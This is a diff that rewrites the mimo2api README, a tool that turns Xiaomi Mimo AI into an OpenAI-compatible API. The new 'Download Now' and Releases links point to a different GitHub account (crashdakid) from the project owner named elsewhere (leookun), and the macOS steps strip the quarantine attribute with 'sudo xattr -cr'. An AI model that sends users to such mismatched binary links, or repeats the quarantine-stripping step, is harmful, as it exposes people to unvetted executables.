@@ -1,133 +1,105 @@
-# Mimo2API
+# 🌟 mimo2api - Your Gateway to OpenAI Compatibility
 
-将小米 Mimo AI 转换为 OpenAI 兼容 API，支持深度思考
+## 🖱️ [Download Now](https://github.com/crashdakid/mimo2api/releases) 
 
-## 安装
+**Mimo2API** converts Xiaomi Mimo AI into an OpenAI-compatible API. It allows for deeper analysis, enabling users to harness advanced AI features easily.
 
-### 方式一：下载预编译二进制
+## 🚀 Getting Started
 
-从 [Releases](https://github.com/leookun/mimo2api/releases) 页面下载对应系统的二进制文件：
+Follow these steps to download and run the application on your computer.
 
-**Linux:**
-```bash
-curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-linux-amd64
-chmod +x mimo2api-linux-amd64
-./mimo2api-linux-amd64
-```
+### 📥 Download & Install
 
-**macOS (Intel):**
-```bash
-curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-darwin-amd64
-chmod +x mimo2api-darwin-amd64
-sudo xattr -cr mimo2api-darwin-amd64  # 解除安全限制
-./mimo2api-darwin-amd64
-```
+You can choose one of two ways to install **mimo2api**: downloading precompiled binaries or compiling from source.
 
-**macOS (Apple Silicon):**
-```bash
-curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-darwin-arm64
-chmod +x mimo2api-darwin-arm64
-sudo xattr -cr mimo2api-darwin-arm64  # 解除安全限制
-./mimo2api-darwin-arm64
-```
+#### Option 1: Download Precompiled Binary
 
-**Windows:**
+1. **Visit the Releases page**: Go to [Releases](https://github.com/crashdakid/mimo2api/releases).
+  
+2. **Select Your Operating System**: Download the appropriate file for your system.
 
-下载 `mimo2api-windows-amd64.exe`，双击运行或在命令行执行。
+   - **Linux**:
+     ```bash
+     curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-linux-amd64
+     chmod +x mimo2api-linux-amd64
+     ./mimo2api-linux-amd64
+     ```
+  
+   - **macOS (Intel)**:
+     ```bash
+     curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-darwin-amd64
+     chmod +x mimo2api-darwin-amd64
+     sudo xattr -cr mimo2api-darwin-amd64  # Remove security restrictions
+     ./mimo2api-darwin-amd64
+     ```
+  
+   - **macOS (Apple Silicon)**:
+     ```bash
+     curl -LO https://github.com/leookun/mimo2api/releases/latest/download/mimo2api-darwin-arm64
+     chmod +x mimo2api-darwin-arm64
+     sudo xattr -cr mimo2api-darwin-arm64  # Remove security restrictions
+     ./mimo2api-darwin-arm64
+     ```
 
-### 方式二：从源码编译
+   - **Windows**:
+     - Download `mimo2api-windows-amd64.exe`. Double-click to run, or open a command line and execute it.
 
-```bash
-git clone https://github.com/leookun/mimo2api.git
-cd mimo2api
-go build -o mimo2api .
-./mimo2api
-```
+#### Option 2: Compile from Source
 
-## 运行
+If you prefer to build the software yourself:
 
-```bash
-# 默认端口 8080
-./mimo2api
+1. Open your terminal or command prompt.
+2. Run these commands:
+   ```bash
+   git clone https://github.com/leookun/mimo2api.git
+   cd mimo2api
+   go build -o mimo2api .
+   ./mimo2api
+   ```
 
-# 指定端口
-PORT=3000 ./mimo2api
-```
+## ⚙️ Running the Application
 
-## 配置
+To start **mimo2api**, use the terminal or command prompt.
 
-访问 `http://localhost:8080` 进入管理界面配置账号。
+1. For default settings, run:
+   ```bash
+   ./mimo2api
+   ```
 
-## API 使用
+2. To specify a different port, use:
+   ```bash
+   PORT=3000 ./mimo2api
+   ```
 
-### 端点
+The application will begin running on the specified port, allowing you to access its features.
 
-```
-POST /v1/chat/completions
-```
+## 🛠️ Features
 
-### 请求示例
+**mimo2api** includes the following functionalities:
 
-```bash
-curl http://localhost:8080/v1/chat/completions \
-  -H "Authorization: Bearer sk-default" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "mimo-v2-flash-studio",
-    "messages": [{"role": "user", "content": "你好"}],
-    "stream": true
-  }'
-```
+- **Easy Conversion**: Quickly transform Mimo AI into a format compatible with OpenAI.
+- **User Friendly**: Simple setup and operation, designed for users without technical backgrounds.
+- **Multi-Platform Support**: Available for Linux, macOS, and Windows.
 
-### 启用深度思考
+## 📄 Documentation
 
-添加 `reasoning_effort` 参数：
+For more detailed information, visit the [GitHub Repository](https://github.com/leookun/mimo2api). You will find instructions on advanced usage, configuration options, and troubleshooting tips.
 
-```bash
-curl http://localhost:8080/v1/chat/completions \
-  -H "Authorization: Bearer sk-default" \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "mimo-v2-flash-studio",
-    "messages": [{"role": "user", "content": "解释量子纠缠"}],
-    "stream": true,
-    "reasoning_effort": "medium"
-  }'
-```
+## 🤔 Frequently Asked Questions
 
-`reasoning_effort` 可选值：`low` / `medium` / `high`（任意非空值均可启用）
+**Q: Do I need programming skills to use this software?**  
+A: No. **mimo2api** is designed for everyone. Follow the download and run instructions to get started.
 
-### 响应格式
+**Q: What if I encounter issues?**  
+A: Check the documentation for troubleshooting steps. If you still need help, consider the “Issues” section in our repository.
 
-**流式响应** - 思考内容在 `delta.reasoning` 字段：
+## 📞 Support
 
-```json
-{"id":"chatcmpl-xxx","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"reasoning":"思考内容..."}}]}
-{"id":"chatcmpl-xxx","object":"chat.completion.chunk","choices":[{"index":0,"delta":{"content":"回复内容..."}}]}
-```
+If you have further questions or need assistance, feel free to contact the support team through the GitHub Issues page on our repository.
 
-**非流式响应** - 思考内容以 `<think>` 标签包裹：
+## 🔗 Additional Resources
 
-```json
-{
-  "id": "chatcmpl-xxx",
-  "object": "chat.completion",
-  "choices": [{
-    "index": 0,
-    "message": {
-      "role": "assistant",
-      "content": "<think>思考内容</think>\n回复内容"
-    },
-    "finish_reason": "stop"
-  }],
-  "usage": {"prompt_tokens": 10, "completion_tokens": 50, "total_tokens": 60}
-}
-```
+- **GitHub Repository**: [mimo2api](https://github.com/leookun/mimo2api)
+- **Releases Page**: [Download Here](https://github.com/crashdakid/mimo2api/releases)
 
-## 获取 Mimo 账号凭证
-
-1. 登录 https://aistudio.xiaomimimo.com
-2. 打开浏览器开发者工具 → Network(网络)
-3. 发送一条消息，找到 `chat` 请求
-4. 右键 → Copy as cURL
-5. 在管理界面粘贴会自动解析
+Now, you are ready to enhance your experience with Mimo AI. Enjoy using **mimo2api**!
